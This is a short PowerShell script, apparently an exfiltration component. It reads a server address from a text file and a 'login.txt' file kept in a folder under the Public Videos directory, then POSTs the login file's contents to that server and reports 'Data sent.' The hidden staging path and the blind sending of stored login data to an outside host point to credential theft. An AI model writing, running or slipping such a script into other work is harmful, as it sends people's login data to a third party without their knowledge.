$urlFile = "C:\Users\Public\Videos\GraphicalUserInterface\url.txt"
$loginFile = "C:\Users\Public\Videos\GraphicalUserInterface\login.txt"

# Read the server IP from the url.txt file
$serverIP = Get-Content -Path $urlFile

# Read the content of login.txt
$loginContent = Get-Content -Path $loginFile -Raw

# Send the login content to the server with a timeout of 60 seconds
try {
    $response = Invoke-WebRequest -Uri "$serverIP" -Method POST -Body $loginContent -TimeoutSec 60
    if ($response.StatusCode -eq 200) {
        Write-Host "Data sent."
    } else {
        Write-Host "Error: Unexpected response status code $($response.StatusCode)."
    }
} catch {
    Write-Host "Error: $_"
}
